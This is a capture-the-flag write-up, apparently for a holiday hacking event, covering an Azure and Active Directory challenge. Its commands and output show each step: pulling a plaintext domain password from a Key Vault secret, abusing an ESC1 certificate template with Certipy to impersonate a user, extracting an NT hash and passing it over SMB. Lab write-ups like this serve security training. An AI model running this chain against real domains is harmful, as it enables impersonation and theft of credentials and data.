---
icon: material/text-box-outline
---

# Active Directory

**Difficulty**: <i class=twemoji_red>:fontawesome-solid-tree::fontawesome-solid-tree::fontawesome-solid-tree::fontawesome-solid-tree:</i>:fontawesome-solid-tree:<br/>


## Objective

!!! question "Request"
    Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the <em>FileShare</em>?

??? quote "Ribb Bonbowford"
    Hi there, could you do me a quick favor?<br/>
    Can you go and check on Alabaster Snowball for me? He's at Rainraster Cliffs on Pixel Island. I heard some rumors he's been experimenting with ChatNPT again and I'm a little worried about what he's cooking up.<br/>
    Thank you so much!<br/>
    Please let me know what you find out.<br/>
    <br/>
    Hello, I'm Ribb Bonbowford. Nice to meet you!<br/>
    Oh golly! It looks like Alabaster deployed some vulnerable Azure Function App Code he got from ChatNPT.<br/>
    Don't get me wrong, I'm all for testing new technologies. The problem is that Alabaster didn't review the generated code and used the Geese Islands Azure production environment for his testing.<br/>
    I'm worried because our Active Directory server is hosted there and Wombley Cube's research department uses one of its fileshares to store their sensitive files.<br/>
    I'd love for you to help with auditing our Azure and Active Directory configuration and ensure there's no way to access the research department's data.<br/>
    Since you have access to Alabaster's SSH account that means you're already in the Azure environment. Knowing Alabaster, there might even be some useful tools in place already.<br/>

## Hints

??? tip "Useful Tools"
    It looks like Alabaster's SSH account has a couple of tools installed which might prove useful.

??? tip "Misconfiguration ADventures"
    Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.

## Solution

This section explains the different steps taken to solve the challenge. Try to find a good balance between providing sufficient detail and not overloading the reader with too much information. Use [admonitions](https://squidfunk.github.io/mkdocs-material/reference/admonitions/), [images](https://squidfunk.github.io/mkdocs-material/reference/images/), [diagrams](https://squidfunk.github.io/mkdocs-material/reference/diagrams/), [code blocks](https://squidfunk.github.io/mkdocs-material/reference/code-blocks/), and [tables](https://squidfunk.github.io/mkdocs-material/reference/data-tables/) to highlight and structure important information or provide additional clarification.

Looks like we need to SSH back in to **ssh-server-vm.santaworkshopgeeseislands.org** as alabaster to help audit the environment.
From the [Reportinator](https://hhc23-reportinator-dot-holidayhack2023.ue.r.appspot.com/?&challenge=reportinator) we learned that a "Vulnerable Active Directory Certificate Service-Certificate Template Allows Group/User Privilege Escalation" and [Certipy](https://github.com/ly4k/Certipy) was used to validate that.

In order to check that though, we need to find targets to run against. 

Looking at the system, we aren't seeing anything stick out as it pertains to domain memberships, file shares in use, etc. So looks like we are going to need to go back to the Azure REST API to see what we can glean.

We get our access token and start back at what [Subscriptions](https://learn.microsoft.com/en-us/rest/api/subscription/subscriptions/list?view=rest-subscription-2021-10-01&tabs=HTTP) and [Resource Groups](https://learn.microsoft.com/en-us/rest/api/resources/resource-groups/list?view=rest-resources-2021-04-01) we have access to

```bash
$ curl -X GET -H "Authorization: Bearer $accesstok" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/resources?api-version=2018-02-01 | jq

{
  "value": [
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv",
      "name": "northpole-ssh-certs-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {}
    },
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv",
      "name": "northpole-it-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {}
    }
  ]
}
```
Looks like we have a couple of [Key Vaults](https://learn.microsoft.com/en-us/rest/api/keyvault/keyvault/vaults?view=rest-keyvault-keyvault-2022-07-01) here. We check those out using the following commands:

```bash
curl -X GET -H "Authorization: Bearer $accesstok" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv?api-version=2023-07-01

curl -X GET -H "Authorization: Bearer $accesstok" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv?api-version=2023-07-01
```
And we see **"vaultUri":"https://northpole-ssh-certs-kv.vault.azure.net/"** and **"vaultUri":"https://northpole-it-kv.vault.azure.net/"**

So in order to interact with the Key Vaults to get [Secrets](https://learn.microsoft.com/en-us/rest/api/keyvault/secrets/get-secrets/get-secrets?view=rest-keyvault-secrets-7.4&tabs=HTTP) and [Keys](https://learn.microsoft.com/en-us/rest/api/keyvault/keys/get-keys/get-keys?view=rest-keyvault-keys-7.4&tabs=HTTP) we need to generate a new access token, but using **https://vault.azure.net** as the resource, otherwise we get the following error:

```bash
{"error":{"code":"Unauthorized","message":"AKV10022: Invalid audience. Expected https://vault.azure.net, found: https://management.azure.com/."}}
```
So, we generate a new [token](vault_tok=$(curl -G -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq '.access_token' | sed -r 's/\"//g')), and work to interact with the key vaults. Trying to access /keys for both vaults returns errors, same for northpole-ssh-certs-kv.vault.azure.net/secrets, but ...

```bash
labaster@ssh-server-vm:~$ curl -X GET -H "Authorization: Bearer $vault_tok" https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4 | jq

{
  "value": [
    {
      "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript",
      "attributes": {
        "enabled": true,
        "created": 1699564823,
        "updated": 1699564823,
        "recoveryLevel": "Recoverable+Purgeable",
        "recoverableDays": 90
      },
      "tags": {}
    }
  ],
  "nextLink": null
}

alabaster@ssh-server-vm:~$ curl -X GET -H "Authorization: Bearer $vault_tok" https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4 | jq

{
  "value": "Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru",
  "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d",
  "attributes": {
    "enabled": true,
    "created": 1699564823,
    "updated": 1699564823,
    "recoveryLevel": "Recoverable+Purgeable",
    "recoverableDays": 90
  },
  "tags": {}
}

```
Not only do we now have an IP address and domain name, but we have a set of credentials as well. Alabaster was kind enough to download [Impacket Tools](https://github.com/fortra/impacket) and [Certipy](https://github.com/ly4k/Certipy).

Let's unumerate some users and see what we have

```bash
alabaster@ssh-server-vm:~/impacket$ GetADUsers.py northpole.local/elfy:'J4`ufC49/J4766' -dc-ip 10.0.0.53 -all
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Querying 10.0.0.53 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
alabaster                                             2024-01-06 01:03:31.339134  2024-01-06 01:20:28.010560 
Guest                                                 <never>              <never>             
krbtgt                                                2024-01-06 01:10:42.425972  <never>             
elfy                                                  2024-01-06 01:12:47.319022  2024-01-06 04:45:11.082839 
wombleycube                                           2024-01-06 01:12:47.444032  2024-01-06 04:51:15.366356 
```
They did mention that Wombley's research department was using the same environment here, and knowing we have a vulnerable certificate template, we can use Certipy to check and see if we can impersonate Wombley.

```
alabaster@ssh-server-vm:~/impacket$ certipy find -vulnerable -dc-ip 10.0.0.53 -target-ip 10.0.0.53 -u elfy -p 'J4`ufC49/J4766'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'northpole-npdc01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'northpole-npdc01-CA'
[*] Saved BloodHound data to '20240106044521_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20240106044521_Certipy.txt'
[*] Saved JSON output to '20240106044521_Certipy.json'

alabaster@ssh-server-vm:~/impacket$ cat 20240106044521_Certipy.txt
Certificate Authorities
  0
    CA Name                             : northpole-npdc01-CA
    DNS Name                            : npdc01.northpole.local
    Certificate Subject                 : CN=northpole-npdc01-CA, DC=northpole, DC=local
    Certificate Serial Number           : 1D021F0D85341EB2421ED85829DB0930
    Certificate Validity Start          : 2024-01-06 01:05:36+00:00
    Certificate Validity End            : 2029-01-06 01:15:35+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : NORTHPOLE.LOCAL\Administrators
      Access Rights
        ManageCertificates              : NORTHPOLE.LOCAL\Administrators
                                          NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        ManageCa                        : NORTHPOLE.LOCAL\Administrators
                                          NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        Enroll                          : NORTHPOLE.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : NorthPoleUsers
    Display Name                        : NorthPoleUsers
    Certificate Authorities             : northpole-npdc01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Domain Users
                                          NORTHPOLE.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : NORTHPOLE.LOCAL\Enterprise Admins
        Write Owner Principals          : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        Write Dacl Principals           : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        Write Property Principals       : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC1                              : 'NORTHPOLE.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication

```

Here we see validated a Vulnerable Template named **NorthPoleUsers**. We take the next step and leverage this

```
alabaster@ssh-server-vm:~/impacket$ certipy req -username elfy@northpole.local -password 'J4`ufC49/J4766' -ca northpole-npdc01-CA -target 10.0.0.53 -template NorthPoleUsers -upn wombleycube@northpole.local -dns npdc01.northpole.local
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Failed to resolve: NORTHPOLE.LOCAL
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with multiple identifications
    UPN: 'wombleycube@northpole.local'
    DNS Host Name: 'npdc01.northpole.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'wombleycube_npdc01.pfx'

alabaster@ssh-server-vm:~/impacket$ certipy auth -pfx wombleycube_npdc01.pfx -dc-ip 10.0.0.53
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'wombleycube@northpole.local'
    [1] DNS Host Name: 'npdc01.northpole.local'
> 0
[*] Using principal: wombleycube@northpole.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'wombleycube.ccache'
[*] Trying to retrieve NT hash for 'wombleycube'
[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
```
we now have a hash for Wombley Cube. We can use that with [smbclient.py](https://github.com/fortra/impacket/blob/master/examples/smbclient.py) to attempt to connect to a fileserver

```
alabaster@ssh-server-vm:~/impacket$ smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 -dc-ip 10.0.0.53 northpole.local/wombleycube@10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL
# use FileShare
# ls
drw-rw-rw-          0  Sat Jan  6 01:13:42 2024 .
drw-rw-rw-          0  Sat Jan  6 01:13:38 2024 ..
-rw-rw-rw-     701028  Sat Jan  6 01:13:41 2024 Cookies.pdf
-rw-rw-rw-    1521650  Sat Jan  6 01:13:41 2024 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Sat Jan  6 01:13:41 2024 SignatureCookies.pdf
drw-rw-rw-          0  Sat Jan  6 01:13:42 2024 super_secret_research
-rw-rw-rw-        165  Sat Jan  6 01:13:42 2024 todo.txt
# cd super_secret_research
# ls
drw-rw-rw-          0  Sat Jan  6 01:13:42 2024 .
drw-rw-rw-          0  Sat Jan  6 01:13:42 2024 ..
-rw-rw-rw-        231  Sat Jan  6 01:13:42 2024 InstructionsForEnteringSatelliteGroundStation.txt
# cat InstructionsForEnteringSatelliteGroundStation.txt
Note to self:

To enter the Satellite Ground Station (SGS), say the following into the speaker:

And he whispered, 'Now I shall be out of sight;
So through the valley and over the height.'
And he'll silently take his way.

```

!!! success "Answer"
    InstructionsForEnteringSatelliteGroundStation.txt

## Response

!!! quote "Ribb Bonbowford"
    Copy the final part of the conversation with Elf Name here.
